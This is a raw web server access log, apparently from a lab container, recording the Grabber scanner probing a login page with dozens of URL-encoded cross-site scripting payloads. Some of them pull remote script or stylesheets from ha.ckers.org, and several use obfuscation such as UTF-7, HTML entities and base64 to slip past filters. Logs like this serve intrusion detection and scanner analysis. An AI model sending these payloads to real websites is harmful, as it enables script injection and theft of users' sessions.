172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:31 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /?username=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:32 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?username=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /?user_token=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:33 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
